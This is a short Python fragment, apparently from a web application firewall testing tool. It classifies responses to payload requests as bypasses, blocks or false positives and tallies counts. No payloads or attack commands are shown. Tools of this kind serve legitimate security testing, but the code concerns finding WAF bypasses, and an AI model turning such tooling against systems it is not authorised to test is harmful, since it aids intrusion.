    classification, waf_vendor, similarity = classify_response(
        baseline, status, body_text, length, title, headers
    )

    result = TestResult(
        url=test_url, payload=payload, status_code=status,
        content_length=length, title=title, classification=classification,
        waf_vendor=waf_vendor, similarity=similarity,
    )

    if classification == "BYPASS":
        stats.incr("bypasses")
    elif classification == "WAF_BLOCK":
        stats.incr("waf_blocks")
    elif classification == "FALSE_POSITIVE":
        stats.incr("false_positives")

    return result


